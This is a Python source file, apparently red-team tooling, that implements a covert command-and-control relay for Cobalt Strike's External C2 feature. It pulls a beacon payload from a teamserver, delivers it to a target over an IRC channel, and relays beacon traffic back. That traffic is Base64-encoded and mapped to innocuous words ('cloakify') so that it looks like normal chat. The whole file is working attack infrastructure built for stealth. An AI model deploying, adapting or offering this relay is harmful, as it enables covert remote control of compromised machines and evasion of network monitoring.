"""
    IRCServ.py
    by Lt Daniel Fitzgerald
    Jan 2020

    Program to provide covert communications over IRC for Cobalt Strike using the External C2 feature.
    
    Instead of using cloakify to convert Base64 messages to normal looking strings, it just sends the Base64 
    message over IRC. I intend to finish development on cloakify feature but keep in mind this will 
    drastically increase the size of data being sent and in turn the number of packets.    
"""
import argparse
import base64
import datetime
import ipaddress
import socket
import struct
import sys
import time


# List of Base64 characters
B64List = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/+=")
# List of strings for Cloakify
CipherList = [
    "apple",
    "bob",
    "carrot",
    "dessert",
    "eagle",
    "fan",
    "good",
    "happy",
    "ice",
    "juice",
    "kiwi",
    "lucky",
    "mini",
    "nickle",
    "open",
    "process",
    "query",
    "recursive",
    "sort",
    "truncate",
    "under",
    "vacate",
    "window",
    "xxx",
    "yellow",
    "zebra",
    "Alpha",
    "Bravo",
    "Charlie",
    "Delta",
    "Echo",
    "Foxtrot",
    "Golf",
    "Hotel",
    "India",
    "Julliett",
    "Kilo",
    "Lima",
    "Mike",
    "November",
    "Oscar",
    "Papa",
    "Qubec",
    "Romeo",
    "Sierra",
    "Tango",
    "Uniform",
    "Victor",
    "Whisky",
    "XRay",
    "Yankee",
    "Zulu",
    "zero",
    "one",
    "two",
    "three",
    "four",
    "five",
    "six",
    "seven",
    "eight",
    "nine",
    "slash",
    "plus",
    "equal"
]


class IRCinfo:
    """
    @brief Class to hold info for IRC session
    """
    def __init__(self, src_ip, ip, port, nick, op_nick, op_password, user, real_name, channel, client_nick, traffic_str, len_str, start_str, pipe_str):
        """

        :param src_ip: IP address of CS Teamserver
        :param ip: IP address of IRC server
        :param port: Port of IRC server
        :param nick: NICK program will connect as in irc
        :param op_nick: NICK program will use to auth as an operator
        :param op_password: PASS program will use to auth as an operator
        :param user: USER program will connect as
        :param real_name: REALNAME program will connect as
        :param channel: CHANNEL program will auto-join
        :param client_nick: NICK program will send data to (should be NICK C2 client connected as)
        :param traffic_str: String that will prefix the B64 encoded message.
        :param len_str: String that will prefix the int representing the length of the incomming B64 encoded data.
        :param start_str: String that will tell the server to start transmitting data.
        :param pipe_str: String to name the pipe to the beacon. (i.e. mIRC)
        """
        self.src_ip = src_ip
        self.ip = ip
        self.port = port
        self.nick = nick
        self.op_nick = op_nick
        self.op_password = op_password
        self.user = user
        self.real_name = real_name
        self.channel = channel
        self.client_nick = client_nick
        self.traffic_str = traffic_str
        self.len_str = len_str
        self.start_str = start_str
        self.pipe_str = pipe_str
        

class ExternalC2Controller:
    """
    @brief Main ExternalC2 controller class
    """
    def __init__(self, port):
        """

        :param port: Port to connect to TeamServer
        """
        self.port = port

    def encode_frame(self, data):
        """
        
        :param data: data to encode in frame
        :return: data packed in a CS external C2 frame
        """
        return struct.pack("<I", len(data)) + data

    def decode_frame(self, data):
        """
        
        :param data: frame to decode
        :return: length of data and data from frame
        """
        datalen = struct.unpack("<I", data[0:3])
        body = data[4:]
        return datalen, body
    
    def cloakify(self, char):
        """

        :param char: Base64 character to turn into cloakified string
        :return: Cloakified string or None if failed to map to string
        """
        for b64char in B64List:
            if char == b64char:
                index = B64List.index(char)
                return CipherList[index]
        return None

    def decloakify(self, cloakstr):
        """

        :param cloakstr: Cloakfied string
        :return: Base64 character of cloakified string or None if failed to map to B64 character
        """
        for string in CipherList:
            if cloakstr == string:
                index = CipherList.index(cloakstr)
                return B64List[index]
        return None

    def base64(self, msg):
        """

        :param msg: String to encode in Base64
        :return: Base64 encoded string (in bytes)
        """
        b64msg = base64.b64encode(msg)
        return b64msg

    def debase64(self, b64msg):
        """

        :param b64msg: Base64 string to be decoded
        :return: Decoded string
        """
        msg = base64.b64decode(b64msg)
        return msg
    
    def equalcheck(self, b64msg):
        """

        :param b64msg: Base64 string
        :return: Base64 string with == at end of it
        """
        # TODO: Find a better way of checking for end of B64 message
        equalbytes = "=".encode()
        equalequalbytes = "==".encode()
        if b64msg.find(equalequalbytes) != -1:
            return b64msg
        elif b64msg.find(equalbytes) != -1:
            b64msg += equalbytes
            return b64msg
        else:
            b64msg += equalequalbytes
            return b64msg

    def send_to_ts(self, data):
        """
        
        :param data: data to send to team server in the form of a CS External C2 frame
        """
        self._socketTS.sendall(self.encode_frame(data))

    def recv_from_ts(self):
        """
        
        :return: data received from team server in the form of a CS External C2 frame
        """
        data = bytearray()
        _len = self._socketTS.recv(4)
        l = struct.unpack("<I", _len)[0]
        while len(data) < l:
            data += self._socketTS.recv(l - len(data))
        return data

    def sendToBeacon(self, ircinfo, data):
        """
        
        :param ircinfo: Class with user IRC info
        :param data: Data to send to beacon
        """
        pingmsg = "PRIVMSG #{} :PING\r\n".format(ircinfo.channel)
        if len(data) == 1:
            self._socketBeacon.sendall(pingmsg.encode())
        elif len(data) < 1:
            print("Error: len(data) < 1")
            return None
        else:
            frame = self.encode_frame(data)

            encodedmsg = self.base64(frame)
            encodedmsg = self.equalcheck(encodedmsg)

            # print("length of frame: {}".format(len(frame)))
            # print("length of encoded data: {}".format(len(encodedmsg)))

            # Send len of encodedmsg so client can malloc recv buffer
            ircencodedlen = "PRIVMSG #{} :{}-{}\r\n".format(ircinfo.channel, ircinfo.len_str, len(encodedmsg))
            self._socketBeacon.sendall(ircencodedlen.encode())
            #print("Encoded msg start: {}".format(encodedmsg[:30]))
            for char in encodedmsg.decode():
                #print("Char: {}".format(char))
                cloakstr = self.cloakify(char)
                #print("Cloakstr: {}".format(cloakstr))
                ircencodedmsg = "PRIVMSG #{} :{}-{}\r\n".format(ircinfo.channel, ircinfo.traffic_str, cloakstr)
                self._socketBeacon.sendall(ircencodedmsg.encode())
                time.sleep(0.025)
            """
            offset = 0
            # Break up message by 425 bytes. Max IRC message size is 512 per RFC. Got errors when I tried 480 and 499.
            while offset < len(encodedmsg):
                if offset + 425 > len(encodedmsg):
                    ircencodedmsg = "PRIVMSG #{} :{}-{}\r\n".format(ircinfo.channel, ircinfo.traffic_str,
                                                                           encodedmsg[offset:].decode())
                    self._socketBeacon.sendall(ircencodedmsg.encode())
                    break
                else:
                    ircencodedmsg = "PRIVMSG #{} :{}-{}\r\n".format(ircinfo.channel, ircinfo.traffic_str,
                                                                           encodedmsg[offset:offset+425].decode())
                    offset += 425
                    self._socketBeacon.sendall(ircencodedmsg.encode())
                    # Add delay so we dont get Max sendq error
                    time.sleep(0.05)
            """
            print("Finished sending to beacon..")

    def recvFromBeacon(self, ircinfo):
        """

        :param ircinfo: Class with user IRC info
        :return: data received from beacon
        """
        data = ""
        b64message = ""
        message = ""
        quitting = "PRIVMSG #{} :quitting\r\n".format(ircinfo.channel)
        quitmsg = "QUIT :\r\n"
        traffic = "PRIVMSG #{} :{}-".format(ircinfo.channel, ircinfo.traffic_str)
        chanexit = "PRIVMSG #{} :exit".format(ircinfo.channel)
        client_quit = "Client exiting: {}".format(ircinfo.client_nick)
        while True:
            data = self._socketBeacon.recv(4096).decode()
            if len(data) != 0:
                print("From IRC Server: {}".format(data))
            self.ping_check(data)
            if data.find("ERROR") != -1:
                print("Server sent error.")
                if data.find("Closing Link") != -1:
                    print("Error was to close link!")
                    return None
            
            if data.find("PRIVMSG ") != -1:
                if data.find(traffic) != -1:
                    offset = data.find(traffic)
                    if offset != -1:
                        # iterate to beginning of message
                        offset += len(traffic)
                        # -2 to strip \r\n
                        cloakstring = data[offset:-2]
                        print("cloakstr: {}".format(cloakstring))
                        b64char = self.decloakify(cloakstring)
                        if b64char == None:
                            print("decloakify error!!\n")
                            break
                        print("b64char: {}".format(b64char))
                        b64message += b64char
                        if b64message.find("==") != -1:
                            # print("Base64 msg:{}".format(message))
                            message = self.debase64(b64message)
                            break

                if data.find(chanexit) != -1:
                    self._socketBeacon.sendall(quitting.encode())
                    self._socketBeacon.sendall(quitmsg.encode())
                    
            if data.find(client_quit) != -1:
                print("Client quit, also exiting..")
                self._socketBeacon.sendall(quitting.encode())
                self._socketBeacon.sendall(quitmsg.encode())
        
        return message[4:]

    def ping_check(self, data):
        """

        :param data: String received from IRC Server
        """
        if data.find("PING :") != -1:
            pingsvr = data[5:]
            pong = "PONG {}".format(pingsvr)
            self._socketBeacon.sendall(pong.encode())

    def connect_to_irc(self, ircinfo):
        """

        :param ircinfo: Class with user IRC info
        """
        time.sleep(1)
        password = "PASS {}\r\n".format(ircinfo.op_password)
        self._socketBeacon.sendall(password.encode())
        nick = "NICK {}\r\n".format(ircinfo.nick)
        self._socketBeacon.sendall(nick.encode())
        user = "USER {} {} {} :{}\r\n".format(ircinfo.user, "0", "*", ircinfo.real_name)
        self._socketBeacon.sendall(user.encode())
        while True:
            data = self._socketBeacon.recv(4096).decode()
            print("From IRC Server: {}".format(data))

            self.ping_check(data)

            if data.find("MODE ") != -1:
                print("Connection done?")
                break

        userhost = "USERHOST {}\r\n".format(ircinfo.user)
        self._socketBeacon.sendall(userhost.encode())
        data = self._socketBeacon.recv(4096).decode()
        print("From IRC Server: {}".format(data))

    def join_channel(self, ircinfo):
        """

        :param ircinfo: Class with user IRC info
        """
        join = "JOIN #{}\r\n".format(ircinfo.channel)
        self._socketBeacon.sendall(join.encode())
        
    def become_oper(self, ircinfo):
        """

        :param ircinfo: Class with user IRC info
        """
        oper = "OPER {} {}\r\n".format(ircinfo.op_nick, ircinfo.op_password)
        self._socketBeacon.sendall(oper.encode())

    def wait_for_client(self, ircinfo):
        """

        :return: True if start message is seen, False if Closing Link message is seen
        """
        while True:
            data = self._socketBeacon.recv(4096).decode()
            if len(data) != 0:
                print("From IRC Server: {}".format(data))

            self.ping_check(data)

            if data.find("PRIVMSG ") != -1:
                start = "PRIVMSG #{} :{}".format(ircinfo.channel, ircinfo.start_str)
                if data.find(start) != -1:
                    return True

                quitting = "PRIVMSG #{} :quitting\r\n".format(ircinfo.channel)
                quitmsg = "QUIT :\r\n"
                chanexit = "PRIVMSG #{} :exit".format(ircinfo.channel)
                if data.find(chanexit) != -1:
                    self._socketBeacon.sendall(quitting.encode())
                    self._socketBeacon.sendall(quitmsg.encode())
                    return False            

            if data.find("ERROR") != -1:
                print("Server sent error.")
                if data.find("Closing Link") != -1:
                    print("Error was to close link!")
                    return False

    def run(self, ircinfo):
        """

        :param ircinfo: Class with user IRC info
        """
        # Connecting to TS first, if we fail we do so before connecting to target irc server
        self._socketTS = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
        #BUG: I wasnt using src_ip and had hardcoded the teamserver to be on the same box
        #self._socketTS.connect(("127.0.0.1", self.port))
        try:
            self._socketTS.connect((ircinfo.src_ip, self.port))
        except:
            print("Teamserver connection failed. Exiting.")
            return
        
        # Send out config options
        self.send_to_ts("arch=x86".encode())
        self.send_to_ts("pipename={}".format(ircinfo.pipe_str).encode())
        self.send_to_ts("block=500".encode())
        self.send_to_ts("go".encode())

        # Receive the beacon payload from CS to forward to our target
        data = self.recv_from_ts()

        # Now that we have our beacon to send, wait for a connection from our target
        self._socketBeacon = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self._socketBeacon.connect((ircinfo.ip, ircinfo.port))
        except:
            print("IRC connection failed. Exiting.")
            return

        self.connect_to_irc(ircinfo)
        self.join_channel(ircinfo)
        self.become_oper(ircinfo)

        print("Waiting for client to send start string.")
        if self.wait_for_client(ircinfo):
            print("Received C2 connection")
        else:
            print("Link Closed.")
            return

        # Send beacon payload to target
        self.sendToBeacon(ircinfo, data)

        while True:
            data = self.recvFromBeacon(ircinfo)
            if data == None:
                print("Error/exit from beacon")
                break
            print("Received %d bytes from beacon" % len(data))

            print("Sending %d bytes to TS" % len(data))
            self.send_to_ts(data)

            data = self.recv_from_ts()
            print("Received %d bytes from TS and sending to beacon" % len(data))
            self.sendToBeacon(ircinfo, data)


parser = argparse.ArgumentParser(description='Program to provide covert communications over IRC for Cobalt Strike using the External C2 feature.',
                                 usage="\n"
                                       "%(prog)s [SRC_IP] [IRC_IP] [IRC_PORT] [NICK] [OP_NICK] [OP_PASS] [USER] [REAL_NAME] [CHANNEL] [CLIENT_NICK] [TRAFFIC_STR] [LEN_STR] [START_STR]"
                                       "\nUse '%(prog)s -h' for more information.")
parser.add_argument('src_ip', help="IP of teamserver (or redirector). WARNING: This program may error if it is not run on the same box as the teamserver.")
parser.add_argument('irc_ip', help="IP of IRC server, not teamserver. (i.e. UnrealIRCd server)")
parser.add_argument('irc_port', type=int, help="Port number of IRC server. Typically 6667")
parser.add_argument('nick', help="Name your server will use in IRC")
parser.add_argument('op_nick', help="Nick of operator you will authenticate as")
parser.add_argument('op_pass', help="Password used for authenticating as operator")
parser.add_argument('user', help="User your server will use. Only passed to look more normal, choose any normal/expected username.")
parser.add_argument('real_name', help="Realname your server will use. Only passed to look more normal, choose any normal/expected realname.")
parser.add_argument('channel', help="Channel your server will connect to. Enter without #, we do that for you.")
parser.add_argument('client_nick', help="Nick of client you will talk to. You need to set this to the NICK you pass to your client program on target")
parser.add_argument('traffic_str', help="String that will prefix the B64 encoded message. (i.e. TrafficGen) This will be used to find the data in the string. It must be the same as the client.")
parser.add_argument('len_str', help="String that will prefix the int representing the length of the incomming B64 encoded data. (i.e. Len) This will be used to find the lenth. It must be the same as the client.")
parser.add_argument('start_str', help="String that will tell the server to start transmitting data. It must be the same as the client.")
parser.add_argument('pipe_str', help="String to name the pipe to the beacon. It must be the same as the client. (i.e. mIRC)")
parser.add_argument('--teamserver_port', '-tp', default=2222, type=int, help="Customize the port used to connect to the teamserver. Default is 2222.")
args = parser.parse_args()
controller = ExternalC2Controller(args.teamserver_port)
ircinfo = IRCinfo(args.src_ip, args.irc_ip, args.irc_port, args.nick, args.op_nick, args.op_pass, args.user, args.real_name, args.channel, args.client_nick, args.traffic_str, args.len_str, args.start_str, args.pipe_str)
controller.run(ircinfo)
